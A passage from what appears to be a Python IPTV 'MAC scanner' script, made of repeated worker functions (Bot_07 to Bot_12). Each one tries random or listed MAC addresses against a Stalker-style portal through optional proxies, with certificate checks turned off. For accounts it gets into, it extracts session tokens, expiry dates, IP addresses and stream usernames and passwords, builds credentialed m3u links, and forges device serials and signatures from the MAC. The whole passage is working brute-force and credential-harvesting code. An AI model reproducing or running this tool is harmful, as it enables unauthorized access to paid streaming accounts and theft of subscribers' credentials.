                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d7():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(7, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_07'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(7, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d8():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(8, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_08'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(8, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d9():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(9, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_09'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(9, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d10():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(10, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_10'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(10, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d11():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(11, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_11'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(11, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
                        listlink = liveurl
                        livel = ' 🔹🕳🔹 '
                        livelist = list(listlink, macs, token, livel)
                    if channels == '2':
                        listlink = vodurl
                        livel = ' 🔹🕳🔹 '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' 🔹🕳🔹 '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, case, vpn, livelist, vodlist, serieslist, playerapi, SN, SNENC, SNCUT, DEV, DEVENC, SG, SING, SINGENC)


def d12():
    global bad
    global hitc
    global hitr
    global prox
    global tokenr
    for mac in range(12, to, botsay):
        total = mac
        if dosia == '0':
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)
            if macv:
                mac = macv.group()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = 'Bot_12'
        oran = ''
        oran = round(total / to * 100, 2)
        if proxi == '1':
            for pdata in range(12, prox, botsay):
                prox += 1
                bad += 1
                break

        echok(mac, bot, total, hitc, oran, tokenr, proxies)
        bag = 0
        data = ''
        while True:
            try:
                res = ses.get(url1, proxies=proxies, headers=(hea1(macs)), timeout=15, verify=False)
                data = str(res.text)
                break
            except:
                bag = bag + 1
                time.sleep(1)
                if bag == 12:
                    break

        tokenr = ' \x1b[35m'
        if 'token' in data:
            tokenr = '\x1b[0m'
            token = data.replace('{"js":{"token":"', '')
            token = token.split('"')[0]
            bag = 0
            while 1:
                try:
                    res = ses.get(url2, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                    data = ''
                    data = str(res.text)
                    break
                except:
                    bag = bag + 1
                    time.sleep(1)
                    if bag == 12:
                        break

            id = 'null'
            ip = ''
            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass

            if not id == 'null':
                bag = 0
                while 1:
                    try:
                        res = ses.get(url3, proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                        data = ''
                        data = str(res.text)
                        break
                    except:
                        bag = bag + 1
                        time.sleep(1)
                        if bag == 12:
                            break

                if not data.count('phone') == 0:
                    hitr = '\x1b[1;36m'
                    hitc = hitc + 1
                    trh = ''
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]
                            if trh.lower()[:2] == 'un':
                                DaysRemain = ' Days'
                            else:
                                DaysRemain = str(tarih_clear(trh)) + ' Days'
                                trh = trh + ' ' + DaysRemain
                        except:
                            pass

                        hitprint(mac, trh)
                        bag = 0
                        while 1:
                            try:
                                res = ses.get(url6, proxies=proxies, headers=(hea2(macs, token)), timeout=10, verify=False)
                                data = ''
                                data = str(res.text)
                                cid = ''
                                cid = str(res.text).split('ch_id":"')[5].split('"')[0]
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    cid = '94067'
                                    break

                        real = panel
                        m3ulink = ''
                        user = ''
                        pas = ''
                        case = '𝙐𝙣𝙠𝙣𝙤𝙬𝙣'
                        bag = 0
                        while 1:
                            try:
                                res = ses.get((url(cid)), proxies=proxies, headers=(hea2(macs, token)), timeout=15, verify=False)
                                data = ''
                                data = str(res.text)
                                link = data.split('ffmpeg ')[1].split('"')[0].replace('\\/', '/')
                                real = '' + link.split('://')[1].split('/')[0] + ''
                                user = str(link.replace('live/', '').split('/')[3])
                                pas = str(link.replace('live/', '').split('/')[4])
                                m3ulink = 'http://' + real.replace('http://', '').replace('/c/', '') + '/get.php?username=' + str(user) + '&password=' + str(pas) + '&type=m3u_plus'
                                case = goruntu(link)
                                break
                            except:
                                bag = bag + 1
                                time.sleep(1)
                                if bag == 12:
                                    break

                        playerapi = ''
                        if not m3ulink == '':
                            playerlink = str('http://' + real.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                            playerapi = m3uapi(playerlink, macs, token)
                            if playerapi == '':
                                playerlink = str('http://' + panel.replace('http://', '').replace('/c/', '') + '/player_api.php?username=' + user + '&password=' + pas)
                                playerapi = m3uapi(playerlink, macs, token)
                            SN = hashlib.md5(mac.encode('utf-8')).hexdigest()
                            SNENC = SN.upper()
                            SNCUT = SNENC[:13]
                            DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                            DEVENC = DEV.upper()
                            SG = SNCUT + '+' + mac
                            SING = hashlib.sha256(SG.encode('utf-8')).hexdigest()
                            SINGENC = SING.upper()
                            vpn = ''
                            vpn = ip == '' or vpnip(ip)
                        else:
                            vpn = '𝙉𝙊 𝙄𝙋 𝘼𝘿𝘿𝙍𝙀𝙎𝙎'
                    livelist = ''
                    vodlist = ''
                    serieslist = ''
                    if channels == '1' or channels == '2':
